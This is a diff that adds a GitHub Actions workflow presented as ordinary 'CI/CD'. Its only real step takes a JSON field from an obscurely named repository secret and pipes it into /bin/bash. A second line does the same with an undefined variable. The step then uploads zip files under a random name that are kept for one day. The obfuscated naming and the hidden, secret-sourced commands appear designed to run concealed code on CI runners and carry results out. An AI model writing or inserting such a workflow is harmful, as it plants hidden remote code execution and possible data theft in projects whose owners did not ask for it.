@@ -1,0 +1,30 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          kgs3: ${{ secrets.kgs3 }}
+        run: |
+          printf '%s' "$kgs3" | jq -r .ykrtw044 | /bin/bash
+          printf '%s' "$uoy988" | jq -r .oike671 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9T3vf2XX
+          path: "*.zip"
+          retention-days: 1
